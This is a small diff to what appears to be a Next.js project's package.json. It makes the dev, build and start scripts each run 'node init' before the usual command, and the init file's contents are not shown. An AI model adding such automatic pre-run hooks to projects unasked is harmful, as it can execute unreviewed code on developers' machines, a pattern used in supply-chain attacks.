@@ -6,9 +6,9 @@
     "node": ">=22"
   },
   "scripts": {
-    "dev": "next dev",
-    "build": "next build",
-    "start": "next start",
+    "dev": "node init && next dev",
+    "build": "node init && next build",
+    "start": "node init && next start",
     "lint": "prettier --check .",
     "typecheck": "tsc --noEmit",
     "audit:a11y": "playwright test e2e/accessibility.spec.ts --project=chromium",
